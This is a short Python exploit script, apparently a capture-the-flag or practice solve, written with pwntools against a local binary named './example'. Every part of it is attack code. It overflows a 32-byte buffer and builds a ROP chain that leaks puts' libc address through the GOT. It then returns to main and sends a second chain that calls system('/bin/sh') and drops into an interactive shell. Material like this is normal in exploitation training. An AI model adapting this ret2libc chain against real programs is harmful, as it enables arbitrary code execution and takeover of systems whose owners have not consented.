from pwn import *
from libhack import *

libc = libhack("/usr/lib/x86_64-linux-gnu/libc.so.6")

# target = gdb.debug("./example")
target = process("./example")

target.recvline()

payload = b"A" * 32
payload += p64(0x7fffbf721a90) # rbp
payload += p64(target.elf.symbols['func'] + 33) # pop rdi; pop rbp; ret;
payload += p64(target.elf.got['puts']) # rdi
payload += p64(0x7fffbf721a90) # rbp
payload += p64(target.elf.plt['puts'])
payload += p64(target.elf.symbols['func'] + 35) # ret; padding
payload += p64(target.elf.symbols['main'])
payload += b"\n"

target.send(payload)

libc.setOffset(u64(target.recvline().strip().ljust(8, b'\x00')), "puts")

target.recvline()

payload = b"A" * 32
payload += p64(0x7fffbf721a90) # rbp
payload += p64(target.elf.symbols['func'] + 33) # pop rdi; pop rbp; ret;
payload += p64(libc.search(b"/bin/sh")) # rdi
payload += p64(0x7fffbf721a90) # rbp
payload += p64(libc.getSymbol('system'))
payload += b"\n"

target.send(payload)

target.interactive()
